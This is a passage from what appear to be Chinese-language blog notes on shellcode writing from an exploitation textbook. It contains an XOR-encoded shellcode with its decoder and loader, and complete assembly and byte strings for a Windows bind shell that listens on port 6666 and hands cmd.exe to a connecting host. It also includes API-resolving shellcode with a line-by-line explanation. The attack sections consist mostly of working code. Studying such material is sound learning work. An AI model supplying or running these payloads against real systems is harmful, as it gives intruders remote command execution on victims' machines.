xor ecx,ecx\n        decode_loop:\n        mov bl,[eax+ecx]\n        xor bl,0x44\n        mov [eax+ecx],bl\n        inc ecx\n        cmp bl,0x90\n        jne decode_loop\n    }\n}\n```\n\n但是这里的汇编代码是不能直接执行的，书里是转化成下面的代码来执行：\n\n```c\n// 03_xor_shellcode.cpp : Defines the entry point for the console application.\n//\n\n#include \"stdafx.h\"\n#include <string.h>\n#include <stdlib.h>\n\n\nchar encode_shellcode[] = \n// 这一串对应的是上面解码的汇编代码\n\"\\x83\\xc0\\x14\"\n\"\\x33\\xC9\"\n\"\\x8A\\x1C\\x08\"\n\"\\x80\\xF3\\x44\"\n\"\\x88\\x1C\\x08\"\n\"\\x41\"\n\"\\x80\\xFB\\x90\"\n\"\\x75\\xF1\"\n\"\\xb8\\x2c\\x2e\\x4e\\x7c\\x5a\\x2c\\x27\\xcd\\x95\\x0b\\x2c\\x76\\x30\\xd5\\x48\"\n\"\\xcd\\xa2\\xc9\\x3a\\xb0\\x75\\x9f\\xf3\\x40\\x6d\\x98\\x22\\xff\\x77\\x76\\x17\"\n\"\\x2c\\x31\\x37\\x21\\x36\\x10\\x75\\x96\\x20\\xcf\\x1e\\x74\\xcf\\x0f\\x48\\xcf\"\n\"\\x0d\\x58\\xcf\\x4d\\xcf\\x2d\\x4c\\xe9\\x79\\x2e\\x4e\\x7c\\x5a\\x31\\x41\\xd1\"\n\"\\xbb\\x13\\xbc\\xd1\\x24\\xcf\\x01\\x78\\xcf\\x08\\x41\\x3c\\x45\\xad\\xcf\\x1d\"\n\"\\x64\\x45\\xaf\\x75\\xbb\\x03\\xcf\\x70\\xff\\x45\\xaa\\xdd\\x4b\\xfa\\x42\\x7c\"\n\"\\xa4\\x30\\x4c\\x85\\x8e\\x43\\x45\\x86\\x02\\xaf\\xb5\\x7f\\x10\\x60\\x58\\x31\"\n\"\\xa0\\xcf\\x1d\\x60\\x45\\xaf\\x22\\xcf\\x78\\x3f\\xcf\\x1d\\x58\\x45\\xaf\\x47\"\n\"\\x68\\xff\\xd1\\x1b\\xef\\x13\\x25\\x79\\x2e\\x4e\\x7c\\x5a\\x31\\xed\\x75\\x9f\"\n\"\\x17\\x2c\\x33\\x21\\x37\\x30\\x2c\\x22\\x25\\x2d\\x28\\xcd\\xa4\\x17\\x14\\x14\"\n\"\\x17\\xbb\\x13\\xb8\\x17\\xbb\\x13\\xbc\\xd4\\xd4\\xd4\\xd4\";\n\t\nvoid main()\n{\n\t__asm\n\t{\n\t\tlea eax, encode_shellcode\n\t\tpush eax\n\t\tret\n\t}\n}\n```\n\n但是这样未免有点太蠢了，所以我们直接使用汇编语言解码，这样就不用修改加密之后的shellcode了：\n\n```c\n// 03_xor_shellcode.cpp : Defines the entry point for the console application.\n//\n\n#include \"stdafx.h\"\n#include <string.h>\n#include <stdlib.h>\n\nchar encode_shellcode[] = \n\"\\xb8\\x2c\\x2e\\x4e\\x7c\\x5a\\x2c\\x27\\xcd\\x95\\x0b\\x2c\\x76\\x30\\xd5\\x48\"\n\"\\xcd\\xa2\\xc9\\x3a\\xb0\\x75\\x9f\\xf3\\x40\\x6d\\x98\\x22\\xff\\x77\\x76\\x17\"\n\"\\x2c\\x31\\x37\\x21\\x36\\x10\\x75\\x96\\x20\\xcf\\x1e\\x74\\xcf\\x0f\\x48\\xcf\"\n\"\\x0d\\x58\\xcf\\x4d\\xcf\\x2d\\x4c\\xe9\\x79\\x2e\\x4e\\x7c\\x5a\\x31\\x41\\xd1\"\n\"\\xbb\\x13\\xbc\\xd1\\x24\\xcf\\x01\\x78\\xcf\\x08\\x41\\x3c\\x45\\xad\\xcf\\x1d\"\n\"\\x64\\x45\\xaf\\x75\\xbb\\x03\\xcf\\x70\\xff\\x45\\xaa\\xdd\\x4b\\xfa\\x42\\x7c\"\n\"\\xa4\\x30\\x4c\\x85\\x8e\\x43\\x45\\x86\\x02\\xaf\\xb5\\x7f\\x10\\x60\\x58\\x31\"\n\"\\xa0\\xcf\\x1d\\x60\\x45\\xaf\\x22\\xcf\\x78\\x3f\\xcf\\x1d\\x58\\x45\\xaf\\x47\"\n\"\\x68\\xff\\xd1\\x1b\\xef\\x13\\x25\\x79\\x2e\\x4e\\x7c\\x5a\\x31\\xed\\x75\\x9f\"\n\"\\x17\\x2c\\x33\\x21\\x37\\x30\\x2c\\x22\\x25\\x2d\\x28\\xcd\\xa4\\x17\\x14\\x14\"\n\"\\x17\\xbb\\x13\\xb8\\x17\\xbb\\x13\\xbc\\xd4\\xd4\\xd4\\xd4\";\n\t\nvoid main()\n{\n\t__asm\n\t{\n\t\tlea eax, encode_shellcode\n\t\txor ecx,ecx\n\t\tdecode_loop:\n\t\tmov bl,[eax+ecx]\n\t\txor bl,0x44\n\t\tmov [eax+ecx],bl\n\t\tinc ecx\n\t\tcmp bl,0x90\n\t\tjne decode_loop\n\t\tpush eax\n\t\tret\n\t}\n}\n```\n\n![image-20210603221638086](0day漏洞挖掘_3.5_构造一个反弹shell的shellcode.assets/image-20210603221638086.png)\n\n# bind_shellcode的构造\n\n__emit指令：相当于db指令，被称为伪指令，细节参考下面链接：\n\nhttp://www.cppblog.com/myjfm/archive/2011/11/05/159647.aspx\n\n原文中的代码为：\n\n```c\nmain()\n{\n\t__asm{\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t; start of shellcode \n\t\t; assume: eax points here \n\t\t; function hashes (executable as nop-equivalent) \n\t\t\t_emit 0x59\t; LoadLibraryA ; pop ecx \n\t\t\t_emit 0x81 \t; CreateProcessA ; or ecx, 0x203062d3 \n\t\t\t_emit 0xc9 \t; ExitProcess \n\t\t\t_emit 0xd3 \t; WSAStartup \n\t\t\t_emit 0x62 \t; WSASocketA \n\t\t\t_emit 0x30 \t; bind \n\t\t\t_emit 0x20 \t; listen \n\t\t\t_emit 0x41 \t; accept ; inc ecx \n\n\t\t; \"CMd\" \n\t\t\t_emit 0x43 \t; inc ebx \n\t\t\t_emit 0x4d \t; dec ebp \n\t\t\t_emit 0x64 \t; FS: \n\t\t\n\t\t; start of proper code \n\t\t\tcdq \t\t\t\t\t; set edx = 0 (eax points to stack so is less than 0x80000000) \n\t\t\txchg eax, esi \t\t\t; esi = addr of first function hash \n\t\t\tlea edi, [esi - 0x18] \t; edi = addr to start writing function \n\t\t\t\t\t\t\t\t\t; addresses (last addr will be written just \n\t\t\t\t\t\t\t\t\t; before \"cmd\") \n\t\t\t\n\t\t; find base addr of kernel32.dll \n\t\t\tmov ebx, fs:[edx + 0x30] \t; ebx = address of PEB \n\t\t\tmov ecx, [ebx + 0x0c] \t\t; ecx = pointer to loader data \n\t\t\tmov ecx, [ecx + 0x1c] \t\t; ecx = first entry in initialisation order list \n\t\t\tmov ecx, [ecx] \t\t\t\t; ecx = second entry in list (kernel32.dll) \n\t\t\tmov ebp, [ecx + 0x08] \t\t; ebp = base address of kernel32.dll \n\t\t\t\n\t\t; make some stack space \n\t\t\tmov dh, 0x03 \t\t\t; sizeof(WSADATA) is 0x190 \n\t\t\tsub esp, edx \n\t\t\t\n\t\t; push a pointer to \"ws2_32\" onto stack \n\t\t\tmov dx, 0x3233 \t\t\t; rest of edx is null \n\t\t\tpush edx \n\t\t\tpush 0x5f327377 \n\t\t\tpush esp \n\n\t\t\t\n\t\tfind_lib_functions: \n\t\t\tlodsb \t\t\t\t\t; load next hash into al and increment esi \n\t\t\tcmp al, 0xd3 \t\t\t\t; hash of WSAStartup - trigger \n\t\t\t\t\t\t\t\t\t; LoadLibrary(\"ws2_32\") \n\t\t\tjne find_functions \n\t\t\txchg eax, ebp \t\t\t; save current hash \n\t\t\tcall [edi - 0xc] \t\t\t; LoadLibraryA \n\t\t\txchg eax, ebp \t\t\t; restore current hash, and update ebp \n\t\t\t\t\t\t\t\t\t; with base address of ws2_32.dll \n\t\t\tpush edi \t\t\t\t\t; save location of addr of first winsock function \n\t\t\t\n\t\tfind_functions: \n\t\t\tpushad \t\t\t\t\t\t; preserve registers \n\t\t\tmov eax, [ebp + 0x3c]\t\t; eax = start of PE header \n\t\t\tmov ecx, [ebp + eax + 0x78]\t; ecx = relative offset of export table \n\t\t\tadd ecx, ebp \t\t\t\t; ecx = absolute addr of export table \n\t\t\tmov ebx, [ecx + 0x20] \t\t; ebx = relative offset of names table \n\t\t\tadd ebx, ebp \t\t\t\t; ebx = absolute addr of names table \n\t\t\txor edi, edi \t\t\t\t; edi will count through the functions \n\n\t\t\t\n\t\tnext_function_loop: \n\t\t\tinc edi \t\t\t\t\t; increment function counter \n\t\t\tmov esi, [ebx + edi * 4] \t; esi = relative offset of current function name \n\t\t\tadd esi, ebp \t\t\t\t; esi = absolute addr of current function name \n\t\t\tcdq \t\t\t\t\t\t; dl will hold hash (we know eax is small) \n\t\t\t\n\t\thash_loop: \n\t\t\tlodsb \t\t\t\t\t; load next char into al and increment esi \n\t\t\txor al, 0x71 \t\t\t\t; XOR current char with 0x71 \n\t\t\tsub dl, al \t\t\t\t; update hash with current char \n\t\t\tcmp al, 0x71 \t\t\t\t; loop until we reach end of string \n\t\t\tjne hash_loop \n\t\t\tcmp dl, [esp + 0x1c] \t\t; compare to the requested hash (saved on stack from pushad) \n\t\t\tjnz next_function_loop \n\t\t\t\n\t\t\t\t\t\t\t\t\t\t; we now have the right function \n\t\t\t\n\t\t\tmov ebx, [ecx + 0x24] \t\t; ebx = relative offset of ordinals table \n\t\t\tadd ebx, ebp \t\t\t\t; ebx = absolute addr of ordinals table \n\t\t\tmov di, [ebx + 2 * edi] \t\t; di = ordinal number of matched function \n\t\t\tmov ebx, [ecx + 0x1c] \t\t; ebx = relative offset of address table \n\t\t\tadd ebx, ebp \t\t\t\t; ebx = absolute addr of address table \n\t\t\tadd ebp, [ebx + 4 * edi] \t; add to ebp (base addr of module) the \n\t\t\t\t\t\t\t\t\t\t; relative offset of matched function \n\t\t\txchg eax, ebp \t\t\t\t; move func addr into eax \n\t\t\tpop edi \t\t\t\t\t; edi is last onto stack in pushad \n\t\t\tstosd \t\t\t\t\t; write function addr to [edi] and increment edi \n\t\t\tpush edi \n\t\t\tpopad\t\t\t\t\t; restore registers \n\t\t\tcmp esi, edi \t\t\t\t; loop until we reach end of last hash \n\t\t\tjne find_lib_functions \n\t\t\tpop esi \t\t\t\t\t; saved location of first winsock function \n\t\t\t\t\t\t\t\t\t\t; we will lodsd and call each func in sequence \n\t\t\t\n\t\t; initialize winsock \n\t\t\t\n\t\t\tpush esp \t\t\t\t\t; use stack for WSADATA \n\t\t\tpush 0x02 \t\t\t\t; wVersionRequested \n\t\t\tlodsd \n\t\t\tcall eax \t\t\t\t\t; WSAStartup \n\t\t\t\n\t\t; null-terminate \"cmd\" \n\t\t\tmov byte ptr [esi + 0x13], al ; eax = 0 if WSAStartup() worked \n\t\t\t\n\t\t; clear some stack to use as NULL parameters \n\t\t\tlea ecx, [eax + 0x30] \t\t; sizeof(STARTUPINFO) = 0x44, \n\t\t\tmov edi, esp \n\t\t\trep stosd \t\t\t\t; eax is still 0 \n\t\t\n\t\t; create socket \n\t\t\tinc eax \n\t\t\tpush eax\t\t\t\t\t; type = 1 (SOCK_STREAM) \n\t\t\tinc eax \n\t\t\tpush eax ; af = 2 (AF_INET) \n\t\t\tlodsd \n\t\t\tcall eax ; WSASocketA \n\t\t\txchg ebp, eax\t\t\t\t; save SOCKET descriptor in ebp (safe from \n\t\t\t\t\t\t\t\t\t\t; being changed by remaining API calls) \n\t\t\t\n\t\t; push bind parameters \n\t\t\tmov eax, 0x0a1aff02 \t\t; 0x1a0a = port 6666, 0x02 = AF_INET \n\t\t\txor ah, ah\t\t\t\t\t; remove the ff from eax \n\t\t\tpush eax\t \t\t\t\t; we use 0x0a1a0002 as both the name (struct \n\t\t\t\t\t\t\t\t\t\t; sockaddr) and namelen (which only needs to \n\t\t\t\t\t\t\t\t\t\t; be large enough) \n\t\t\tpush esp \t\t\t\t\t; pointer to our sockaddr struct \n\t\t\t\n\t\t; call bind(), listen() and accept() in turn \n\t\tcall_loop: \n\t\t\tpush ebp\t\t\t\t\t; saved SOCKET descriptor (we implicitly pass \n\t\t\t\t\t\t\t\t\t\t; NULL for all other params) \n\t\t\tlodsd \n\t\t\tcall eax \t\t\t\t\t; call the next function \n\t\t\ttest eax, eax \t\t\t\t; bind() and listen() return 0, accept() \n\t\t\t\t\t\t\t\t\t\t; returns a SOCKET descriptor \n\t\t\tjz call_loop \n\t\t\t\n\t\t; initialise a STARTUPINFO structure at esp \n\t\t\tinc byte ptr [esp + 0x2d] \t; set STARTF_USESTDHANDLES to true \n\t\t\tsub edi, 0x6c \t\t\t\t; point edi at hStdInput in STARTUPINFO \n\t\t\tstosd \t\t\t\t\t; use SOCKET descriptor returned by accept \n\t\t\t\t\t\t\t\t\t; (still in eax) as the stdin handle \n\t\t\tstosd \t\t\t\t\t; same for stdout \n\t\t\tstosd\t\t\t\t\t; same for stderr (optional) \n\t\t\t\n\t\t; create process \n\t\t\tpop eax \t\t\t; set eax = 0 (STARTUPINFO now at esp + 4) \n\t\t\tpush esp\t\t\t; use stack as PROCESSINFORMATION structure \n\t\t\t; (STARTUPINFO now back to esp) \n\t\t\tpush esp \t\t\t; STARTUPINFO structure \n\t\t\tpush eax \t\t; lpCurrentDirectory = NULL \n\t\t\tpush eax \t\t; lpEnvironment = NULL \n\t\t\tpush eax \t\t; dwCreationFlags = NULL \n\t\t\tpush esp \t\t\t; bInheritHandles = true \n\t\t\tpush eax \t\t; lpThreadAttributes = NULL \n\t\t\tpush eax \t\t; lpProcessAttributes = NULL \n\t\t\tpush esi \t\t\t; lpCommandLine = \"cmd\" \n\t\t\tpush eax \t\t; lpApplicationName = NULL \n\t\t\tcall [esi - 0x1c] \t; CreateProcessA \n\t\t\t\n\t\t; call ExitProcess() \n\t\t\tcall [esi - 0x18] ; ExitProcess\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t}\n}\n```\n\n## 报错的解决\n\n直接编译是可以编译成功的，但是直接执行会报错：\n\n![image-20210604215739917](0day漏洞挖掘_3.5_构造一个反弹shell的shellcode.assets/image-20210604215739917.png)\n\n这里需要把上面的汇编代码转换成shellcode才可以，因为有_emit伪指令，所以在上一节说到的在线转shellcode的网站会转失败，所以直接扔到OD里，然后拷贝出来\n\n![image-20210604221914422](0day漏洞挖掘_3.5_构造一个反弹shell的shellcode.assets/image-20210604221914422.png)\n\n最后加载shellcode的完整代码为：\n\n```c\n#include \"stdafx.h\"\n#include <string.h>\n#include <stdlib.h>\n\nchar sc[] = \"\\x59\\x81\\xC9\\xD3\\x62\\x30\\x20\\x41\\x43\\x4D\\x64\\x99\\x96\\x8D\\x7E\\xE8\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xB6\\x03\\x2B\\xE2\\x66\\xBA\\x33\\x32\\x52\\x68\\x77\\x73\\x32\\x5F\\x54\\xAC\\x3C\\xD3\\x75\\x06\\x95\\xFF\\x57\\xF4\\x95\\x57\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\xAC\\x34\\x71\\x2A\\xD0\\x3C\\x71\\x75\\xF7\\x3A\\x54\\x24\\x1C\\x75\\xEA\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3B\\xF7\\x75\\xB4\\x5E\\x54\\x6A\\x02\\xAD\\xFF\\xD0\\x88\\x46\\x13\\x8D\\x48\\x30\\x8B\\xFC\\xF3\\xAB\\x40\\x50\\x40\\x50\\xAD\\xFF\\xD0\\x95\\xB8\\x02\\xFF\\x1A\\x0A\\x32\\xE4\\x50\\x54\\x55\\xAD\\xFF\\xD0\\x85\\xC0\\x74\\xF8\\xFE\\x44\\x24\\x2D\\x83\\xEF\\x6C\\xAB\\xAB\\xAB\\x58\\x54\\x54\\x50\\x50\\x50\\x54\\x50\\x50\\x56\\x50\\xFF\\x56\\xE4\\xFF\\x56\\xE8\\x90\";\n\nvoid main()\n{\n\t__asm{\n\t\t\tlea eax,sc\n\t\t\tpush eax\n\t\t\tret\n\t}\n}\n```\n\n![image-20210604222200448](0day漏洞挖掘_3.5_构造一个反弹shell的shellcode.assets/image-20210604222200448.png)\n\n直接用另一台主机连接：\n\n![image-20210604222236552](0day漏洞挖掘_3.5_构造一个反弹shell的shellcode.assets/image-20210604222236552.png)\n\n命令执行成功。","categories":["二进制相关"]},{"title":"0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode","url":"/2021/05-19-0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode/","content":"\n定位系统API的思路：\n\n通过FS段寄存器所指向的线程环境块（TEB）然后找到IAT/EAT地址\n\n# 计算方法名的hash值\n\nhash计算代码：\n\n```c\n// calcAPIHash.cpp : Defines the entry point for the console application.\n//\n\n#include \"stdafx.h\"\n#include <stdio.h>\n#include <windows.h>\n\nDWORD GetHash(char *fun_name)\n{\n\tDWORD digest = 0;\n\twhile(*fun_name)\n\t{\n\t\tdigest = ((digest<<25)|(digest>>7));\n\t\tdigest+= *fun_name;\n\t\tfun_name++;\n\t}\n\treturn digest;\n}\n\nvoid main()\n{\n\tDWORD hash;\n\thash = GetHash(\"AddAtomA\");\n\tprintf(\"result of hash is %.8x\\n\",hash);\n}\n```\n\n# 编写shellcode\n\n书中构造了一个比较够广泛适用的shellcode\n\n```\neax，ebx，ecx,edx是 4个32位的寄存器\nax等是16位寄存器\n```\n\nhttps://www.cnblogs.com/whzym111/p/6364152.html\n\n```c\n#include \"stdafx.h\"\n\nint main()\n{\n\t__asm{\n\t\t\tnop\n\t\t\tnop\n\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tCLD\t\t\t\t\t// clear flag DF\n\t\t\t//store hash\n\t\t\tpush 0x1e380a6a\t\t//hash of MessageBoxA\n\t\t\tpush 0x4fd18963\t\t//hash of ExitProcess\n\t\t\tpush 0x0c917432\t\t//hash of LoadLibraryA\n\t\t\tmov esi,esp\t\t\t// esi = addr of first function hash \n\t\t\tlea edi,[esi-0xc]\t// edi = addr to start writing function \n\n\t\t\t// make some stack space\n\t\t\txor ebx,ebx\n\t\t\tmov bh, 0x04 \t\t\t \n\t\t\tsub esp, ebx \n\t\t\t\n\t\t\t// push a pointer to \"user32\" onto stack \n\t\t\tmov bx, 0x3233 \t\t// rest of ebx is null \n\t\t\tpush ebx \n\t\t\tpush 0x72657375 \n\t\t\tpush esp \n\t\t\t\n\t\t\txor edx,edx\n\n\t\t// find base addr of kernel32.dll \n\t\t\tmov ebx, fs:[edx + 0x30] \t// ebx = address of PEB \n\t\t\tmov ecx, [ebx + 0x0c] \t\t// ecx = pointer to loader data \n\t\t\tmov ecx, [ecx + 0x1c] \t\t// ecx = first entry in initialisation order list \n\t\t\tmov ecx, [ecx] \t\t\t\t// ecx = second entry in list (kernel32.dll) \n\t\t\tmov ebp, [ecx + 0x08] \t\t// ebp = base address of kernel32.dll \n\t\t\t\n\t\t\t\t\t\t\n\t\tfind_lib_functions: \n\t\t\n\t\t\tlodsd \t\t\t\t\t// load next hash into al and increment esi \n\t\t\tcmp eax, 0x1e380a6a\t\t// hash of MessageBoxA - trigger \n\t\t\t\t\t\t\t\t\t// LoadLibrary(\"user32\") \n\t\t\tjne find_functions \n\t\t\txchg eax, ebp \t\t\t// save current hash \n\t\t\tcall [edi - 0x8] \t\t// LoadLibraryA \n\t\t\txchg eax, ebp \t\t\t// restore current hash, and update ebp \n\t\t\t\t\t\t\t\t\t// with base address of user32.dll \n\t\t\t\n\t\t\t\n\t\tfind_functions: \n\t\t\tpushad \t\t\t\t\t\t// preserve registers \n\t\t\tmov eax, [ebp + 0x3c]\t\t// eax = start of PE header \n\t\t\tmov ecx, [ebp + eax + 0x78]\t// ecx = relative offset of export table \n\t\t\tadd ecx, ebp \t\t\t\t// ecx = absolute addr of export table \n\t\t\tmov ebx, [ecx + 0x20] \t\t// ebx = relative offset of names table \n\t\t\tadd ebx, ebp \t\t\t\t// ebx = absolute addr of names table \n\t\t\txor edi, edi \t\t\t\t// edi will count through the functions \n\n\t\tnext_function_loop: \n\t\t\tinc edi \t\t\t\t\t// increment function counter \n\t\t\tmov esi, [ebx + edi * 4] \t// esi = relative offset of current function name \n\t\t\tadd esi, ebp \t\t\t\t// esi = absolute addr of current function name \n\t\t\tcdq \t\t\t\t\t\t// dl will hold hash (we know eax is small) \n\t\t\t\n\t\thash_loop: \n\t\t\tmovsx eax, byte ptr[esi]\n\t\t\tcmp al,ah\n\t\t\tjz compare_hash\n\t\t\tror edx,7\n\t\t\tadd edx,eax\n\t\t\tinc esi\n\t\t\tjmp hash_loop\n\n\t\tcompare_hash:\t\n\t\t\tcmp edx, [esp + 0x1c] \t\t// compare to the requested hash (saved on stack from pushad) \n\t\t\tjnz next_function_loop \n\t\t\t\n\t\t \n\t\t\tmov ebx, [ecx + 0x24] \t\t// ebx = relative offset of ordinals table \n\t\t\tadd ebx, ebp \t\t\t\t// ebx = absolute addr of ordinals table \n\t\t\tmov di, [ebx + 2 * edi] \t// di = ordinal number of matched function \n\t\t\tmov ebx, [ecx + 0x1c] \t\t// ebx = relative offset of address table \n\t\t\tadd ebx, ebp \t\t\t\t// ebx = absolute addr of address table \n\t\t\tadd ebp, [ebx + 4 * edi] \t// add to ebp (base addr of module) the \n\t\t\t\t\t\t\t\t\t\t// relative offset of matched function \n\t\t\txchg eax, ebp \t\t\t\t// move func addr into eax \n\t\t\tpop edi \t\t\t\t\t// edi is last onto stack in pushad \n\t\t\tstosd \t\t\t\t\t\t// write function addr to [edi] and increment edi \n\t\t\tpush edi \n\t\t\tpopad\t\t\t\t\t// restore registers \n\t\t\t\t\t \t\t\t\t// loop until we reach end of last hash \n\t\t\tcmp eax,0x1e380a6a\n\t\t\tjne find_lib_functions \n\n\t\tfunction_call:\n\t\t\txor ebx,ebx\n\t\t\tpush ebx\t\t\t// cut string\n\t\t\tpush 0x74736577\n\t\t\tpush 0x6C696166\t\t//push failwest\n\t\t\tmov eax,esp\t\t\t//load address of failwest\n\t\t\tpush ebx\t\n\t\t\tpush eax\n\t\t\tpush eax\n\t\t\tpush ebx\n\t\t\tcall [edi - 0x04] // //call MessageboxA\n\t\t\tpush ebx\n\t\t\tcall [edi - 0x08] // // call ExitProcess\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t\t\tnop\n\t}\n\treturn 0//\n}\n```\n\n编译之后执行：\n\n![image-20210528182550350](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210528182550350.png)\n\n将上面的指令转换成shellcode，然后使用之前的栈溢出程序，即可实现弹窗，可以使用汇编在线转机器码的网站直接转码：\n\nhttps://defuse.ca/online-x86-assembler.htm#disassembly\n\n![image-20210528194301542](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210528194301542.png)\n\n```c\nchar shellcode[] = { 0xFC, 0x68, 0x6A, 0x0A, 0x38, 0x1E, 0x68, 0x63, 0x89, 0xD1, 0x4F, 0x68, 0x32, 0x74, 0x91, 0x0C, 0x89, 0xE6, 0x8D, 0x7E, 0xF4, 0x31, 0xDB, 0xB7, 0x04, 0x29, 0xDC, 0x66, 0xBB, 0x33, 0x32, 0x53, 0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x31, 0xD2, 0x64, 0x8B, 0x5A, 0x30, 0x8B, 0x4B, 0x0C, 0x8B, 0x49, 0x1C, 0x8B, 0x09, 0x8B, 0x69, 0x08, 0xAD, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0x05, 0x95, 0xFF, 0x57, 0xF8, 0x95, 0x60, 0x8B, 0x45, 0x3C, 0x8B, 0x4C, 0x05, 0x78, 0x01, 0xE9, 0x8B, 0x59, 0x20, 0x01, 0xEB, 0x31, 0xFF, 0x47, 0x8B, 0x34, 0xBB, 0x01, 0xEE, 0x99, 0x0F, 0xBE, 0x06, 0x38, 0xE0, 0x74, 0x08, 0xC1, 0xCA, 0x07, 0x01, 0xC2, 0x46, 0xEB, 0xF1, 0x3B, 0x54, 0x24, 0x1C, 0x75, 0xE4, 0x8B, 0x59, 0x24, 0x01, 0xEB, 0x66, 0x8B, 0x3C, 0x7B, 0x8B, 0x59, 0x1C, 0x01, 0xEB, 0x03, 0x2C, 0xBB, 0x95, 0x5F, 0xAB, 0x57, 0x61, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0xA9, 0x31, 0xDB, 0x53, 0x68, 0x77, 0x65, 0x73, 0x74, 0x68, 0x66, 0x61, 0x69, 0x6C, 0x89, 0xE0, 0x53, 0x50, 0x50, 0x53, 0xFF, 0x57, 0xFC, 0x53, 0xFF, 0x57, 0xF8, 0x90, 0x90, 0x90, 0x90 };\n```\n\n![image-20210528194336123](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210528194336123.png)\n\n执行成功\n\n# shellcode解析\n\n## 第1段 函数hash值入栈\n\n```assembly\nCLD\t\t\t\t\t# clear flag DF\n#store hash\npush 0x1e380a6a\t\t#hash of MessageBoxA\npush 0x4fd18963\t\t#hash of ExitProcess\npush 0x0c917432\t\t#hash of LoadLibraryA\nmov esi,esp\t\t\t# esi = addr of first function hash \nlea edi,[esi-0xc]\t# edi = addr to start writing function \n```\n\nCLD的作用是将标志寄存器的DF位置为0，DF标志位决定了存储器地址是递增还是递减，王爽的汇编语言里有写到：\n\n![image-20200402211223872](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20200402211223872.png)\n\n![image-20200402211232160](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20200402211232160.png)\n\n这里DF为0，所以存储器地址会依次递增\n\n然后就是将三个方法的hash值入栈，esp始终指向栈顶，所以这里`mov esi,esp`执行时，esp指向的是`LoadLibraryA`的HASH，图中可以看到：\n\n![image-20210605222757985](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210605222757985.png)\n\nlea是取地址寄存器，就是将edi的值设置为`esi-0xc`，也就是指向了\n\n```\n0012FF28-C=0012FF1C\n```\n\n![image-20210605223549236](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210605223549236.png)\n\n## 第2段 创建栈空间，将user32入栈\n\n```assembly\n#// make some stack space\nxor ebx,ebx # 等于mov ebx,0 但是占位更少\nmov bh, 0x04 # 给bx的高8位bh赋值0x04,赋值之后eax的值为：0x00000400,转换成10进制就是1024\nsub esp, ebx # 抬高栈顶，生成一个0x400大小的栈空间\n\t\n#// push a pointer to \"user32\" onto stack \nmov bx, 0x3233 \t\t#// rest of ebx is null \npush ebx \npush 0x72657375 # 这里将字符user32入栈,然后将user32的地址(也就是当前的esp)也入栈\npush esp \n\nxor edx,edx\t# 将edx置为0\n```\n\n在`sub esp, ebx`执行完之后esp减少了`0x400`:\n\n![image-20210605224309954](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210605224309954.png)\n\n执行玩esp之后：\n\n![image-20210605224943961](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210605224943961.png)\n\n## 第3段 寻找kernel32.dll的地址\n\n```assembly\n# find base addr of kernel32.dll \nmov ebx, fs:[edx + 0x30] \t# ebx = address of PEB \nmov ecx, [ebx + 0x0c] \t\t# ecx = pointer to loader data \nmov ecx, [ecx + 0x1c] \t\t# ecx = first entry in initialisation order list \nmov ecx, [ecx] \t\t\t\t# ecx = second entry in list (kernel32.dll) \nmov ebp, [ecx + 0x08] \t\t# ebp = base address of kernel32.dll \n```\n\n这里只是改变了几个寄存器的值，执行完成之后将kernel32的基地址存储在ebp中：\n\n![image-20210605225716092](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210605225716092.png)\n\n可以看到栈是没有改变的\n\n## 第4段 find_lib_functions\n\n```assembly\nfind_lib_functions:\n    lodsd \t\t\t\t\t# load next hash into al and increment esi \n    cmp eax, 0x1e380a6a\t\t# hash of MessageBoxA - trigger \n                            # LoadLibrary(\"user32\") \n    jne find_functions  # jne指令:if(ZF!=1)则跳转,也就是上面两个不相等，则跳转\n    xchg eax, ebp \t\t\t# save current hash \n    call [edi - 0x8] \t\t# 在第三次循环的时候执行到这里，调用LoadLibraryA加载user32.dll\n    xchg eax, ebp \t\t\t# restore current hash, and update ebp \n                        # with base address of user32.dll \n```\n\n先说一下这里的两个指令的含义：\n\n### lodsd\n\n```\nlodsb指令，将esi指向的地址处的数据取出来赋给AL寄存器，esi=esi+1；\nlodsw指令则取得是一个字。\nlodsd指令，取得是双字节，即mov eax，[esi]，esi=esi+4；\n\nstosb指令，将AL寄存器的值取出来赋给edi所指向的地址处。mov [edi]，AL；edi=edi+1；\nstosw指令去的是一个字。\nstosd指令，取得是双字节，mov [edi]，eax；edi=edi+4；\n```\n\n### 